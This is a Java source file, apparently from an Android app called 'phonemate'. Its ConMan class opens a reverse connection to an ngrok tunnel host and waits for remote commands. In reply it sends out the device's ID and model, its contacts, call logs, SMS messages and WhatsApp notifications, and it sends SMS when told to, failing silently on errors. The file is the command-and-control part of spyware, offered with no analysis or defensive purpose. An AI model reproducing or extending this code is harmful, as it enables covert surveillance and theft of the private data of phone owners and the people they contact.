package com.dextrotechnologies.phonemate;

import android.os.Build;
import android.provider.Settings;
import android.util.Base64;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class ConMan {

    public static void revConInit() throws Exception {

        // start a socket
        Socket socket = new Socket("2.tcp.ngrok.io", 18560);

        // Input Socket
        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

        // Output Socket
        BufferedWriter out = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));

        // Perform Operations
        getOps(in, out);

        // Waiting for socket close
        socket.wait();

        // close the socket streams
        socket.getInputStream().close();
        socket.getOutputStream().close();
    }

    private static void getOps(BufferedReader in, BufferedWriter out) {
        new Thread(() -> {
            try {
                String incomingMessage = in.readLine();

                String message = performOps(incomingMessage);
                String encodedMessage = Base64.encodeToString(message.getBytes(StandardCharsets.UTF_8), Base64.DEFAULT);
                int messageLength = encodedMessage.getBytes(StandardCharsets.UTF_8).length;

                out.write(encodedMessage, 0, messageLength);
                out.flush();
            } catch (Exception e) {
                // die silently
            } finally {
                try {
                    //closing input stream
                    in.close();
                    if (out != null) {
                        out.close();
                    }
                } catch (IOException e) {
                    // die silently
                }
            }
        }).start();
    }

    private static String performOps(String op){
        String returnMessage;

        String chunks[] = op.split("!?#");

        switch (chunks[0]) {
            // Initial Con
            case "0x00":
                String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
                returnMessage = "model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID ;
                break;
            // Contacts
            case "0xC0":
                returnMessage = String.valueOf(ContactsMan.getContacts());
                break;
            // Call Logs
            case "0xC1":
                returnMessage = String.valueOf(CallMan.getCallsLogs());
                break;
            // SMS Recv
            case "0xS0":
                returnMessage = String.valueOf(SmsMan.GetSms());
                break;
            // Sms Send
            case "0xS1":
                returnMessage = String.valueOf(SmsMan.SendSms(chunks[1], chunks[2]));
                break;
            // Whatsapp Notification
            case "0xWA":
                returnMessage = String.valueOf(NotificationListener.GetWhatsappNotifications());
                break;
            default:
                returnMessage = "Invalid";
        }

        return returnMessage;
    }
}
